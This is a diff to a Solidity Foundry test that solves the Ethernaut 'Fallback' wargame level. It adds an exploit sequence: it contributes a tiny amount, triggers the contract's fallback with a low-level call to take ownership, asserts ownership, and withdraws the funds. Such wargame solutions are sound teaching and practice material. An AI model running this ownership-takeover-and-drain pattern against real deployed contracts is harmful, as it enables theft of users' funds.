@@ -32,14 +32,26 @@ contract FallbackTest is DSTest {
         // LEVEL ATTACK //
         //////////////////
 
-        // ...
+        // 1. contribute()
+        // 2. fallback call
+        // 3. withdraw()
+
+        ethernautFallback.contribute{value: .0001 ether}();
+        bytes4 selector = bytes4(keccak256("aFunctionThatDoesntExist()"));
+        // emit log(string(selector));
+        address(ethernautFallback).call{value: 1 wei}(
+            abi.encodePacked(selector)
+        );
+        assertEq(ethernautFallback.owner(), eoaAddress, "NOT OWNER!");
+        ethernautFallback.withdraw();
 
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
-        
 
-        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
+        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
+            payable(levelAddress)
+        );
         vm.stopPrank();
         assert(levelSuccessfullyPassed);
     }
